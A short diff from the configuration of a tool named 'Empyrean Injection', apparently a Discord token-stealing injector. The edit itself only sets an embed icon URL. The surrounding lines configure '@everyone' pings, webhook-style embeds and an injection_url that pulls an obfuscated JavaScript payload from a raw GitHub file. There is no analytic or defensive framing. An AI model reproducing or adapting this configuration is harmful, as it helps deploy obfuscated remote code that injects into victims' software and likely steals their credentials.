@@ -11,7 +11,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Empyrean Injection', 
-  embed_icon: '', 
+  embed_icon: 'https://github.com/addi00000/empyrean-injection/blob/main/imgs/pfp.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
 
